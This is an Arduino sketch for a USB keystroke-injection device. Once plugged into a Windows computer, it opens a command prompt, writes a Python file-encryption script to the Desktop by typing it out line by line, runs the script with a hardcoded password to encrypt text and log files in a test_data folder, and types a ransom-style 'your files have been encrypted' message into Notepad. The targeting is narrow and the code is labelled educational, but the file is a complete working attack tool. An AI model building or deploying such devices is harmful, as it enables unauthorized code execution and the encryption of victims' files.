#include <Arduino.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

int ms1 = 10;
int ms2 = ms1 * 2;

const char* Key = "12345678"; // Password
const char* text = "Congratulations, your test_data file have been encrypted.";

void typeLine(const char* line, int wait = 10) {
  Keyboard.print(line);
  Keyboard.write(KEY_RETURN);
  delay(wait);
}

void typeProgram(const char* program) {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(ms1);
  Keyboard.releaseAll();
  delay(ms2);
  typeLine(program);
  delay(150);
}

void setup() {
  USB.begin();
  Keyboard.begin();
  delay(500); // Let OS detect USB device

  // CMD on the Desktop
  typeProgram("cmd");
  typeLine("cd %userprofile%\\Desktop");

  // Create Python script via echo
  typeLine("echo import os > encryptor.py");
  typeLine("echo import base64 >> encryptor.py");
  typeLine("echo import getpass >> encryptor.py");
  typeLine("echo from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC >> encryptor.py");
  typeLine("echo from cryptography.fernet import Fernet >> encryptor.py");
  typeLine("echo from cryptography.hazmat.primitives import hashes >> encryptor.py");
  typeLine("echo from cryptography.hazmat.backends import default_backend >> encryptor.py");
  typeLine("echo. >> encryptor.py");

  typeLine("echo def derive_key(password, salt): >> encryptor.py");
  typeLine("echo     kdf = PBKDF2HMAC( >> encryptor.py");
  typeLine("echo         algorithm=hashes.SHA256(), >> encryptor.py");
  typeLine("echo         length=32, >> encryptor.py");
  typeLine("echo         salt=salt, >> encryptor.py");
  typeLine("echo         iterations=390000, >> encryptor.py");
  typeLine("echo         backend=default_backend() >> encryptor.py");
  typeLine("echo     ) >> encryptor.py");
  typeLine("echo     return base64.urlsafe_b64encode(kdf.derive(password.encode())) >> encryptor.py");
  typeLine("echo. >> encryptor.py");

  typeLine("echo def encrypt_folder(folder, fernet): >> encryptor.py");
  typeLine("echo     for root, _, files in os.walk(folder): >> encryptor.py");
  typeLine("echo         for file in files: >> encryptor.py");
  typeLine("echo             if file.endswith('.txt') or file.endswith('.log'): >> encryptor.py");
  typeLine("echo                 path = os.path.join(root, file) >> encryptor.py");
  typeLine("echo                 with open(path, 'rb') as f: >> encryptor.py");
  typeLine("echo                     data = f.read() >> encryptor.py");
  typeLine("echo                 with open(path, 'wb') as f: >> encryptor.py");
  typeLine("echo                     f.write(fernet.encrypt(data)) >> encryptor.py");
  typeLine("echo                 print(f'[+] Encrypted: {path}') >> encryptor.py");
  typeLine("echo. >> encryptor.py");

  typeLine("echo def decrypt_folder(folder, fernet): >> encryptor.py");
  typeLine("echo     for root, _, files in os.walk(folder): >> encryptor.py");
  typeLine("echo         for file in files: >> encryptor.py");
  typeLine("echo             if file.endswith('.txt') or file.endswith('.log'): >> encryptor.py");
  typeLine("echo                 path = os.path.join(root, file) >> encryptor.py");
  typeLine("echo                 with open(path, 'rb') as f: >> encryptor.py");
  typeLine("echo                     data = f.read() >> encryptor.py");
  typeLine("echo                 try: >> encryptor.py");
  typeLine("echo                     decrypted = fernet.decrypt(data) >> encryptor.py");
  typeLine("echo                     with open(path, 'wb') as f: >> encryptor.py");
  typeLine("echo                         f.write(decrypted) >> encryptor.py");
  typeLine("echo                     print(f'[-] Decrypted: {path}') >> encryptor.py");
  typeLine("echo                 except: >> encryptor.py");
  typeLine("echo                     print(f'[!] Failed to decrypt: {path}') >> encryptor.py");
  typeLine("echo. >> encryptor.py");

  typeLine("echo if __name__ == '__main__': >> encryptor.py");
  typeLine("echo     folder = './test_data' >> encryptor.py");
  typeLine("echo     os.makedirs(folder, exist_ok=True) >> encryptor.py");
  typeLine("echo     password = getpass.getpass('Enter password: ') >> encryptor.py");
  typeLine("echo     salt = b'educational_demo_salt!' >> encryptor.py");
  typeLine("echo     key = derive_key(password, salt) >> encryptor.py");
  typeLine("echo     fernet = Fernet(key) >> encryptor.py");
  typeLine("echo     mode = input('Mode (e=encrypt, d=decrypt): ').strip().lower() >> encryptor.py");
  typeLine("echo     if mode == 'e': >> encryptor.py");
  typeLine("echo         encrypt_folder(folder, fernet) >> encryptor.py");
  typeLine("echo     elif mode == 'd': >> encryptor.py");
  typeLine("echo         decrypt_folder(folder, fernet) >> encryptor.py");
  typeLine("echo     else: >> encryptor.py");
  typeLine("echo         print('[!] Invalid mode.') >> encryptor.py");

  // Run the script
  typeLine("python encryptor.py");
  typeLine(Key); // password aka "key"
  typeLine("e"); // encrypt
  typeLine("exit");  // ⬅️ This closes CMD

  // notepad
  typeProgram("notepad");
  typeLine(text);
}

void loop() {
  // Nothing
}
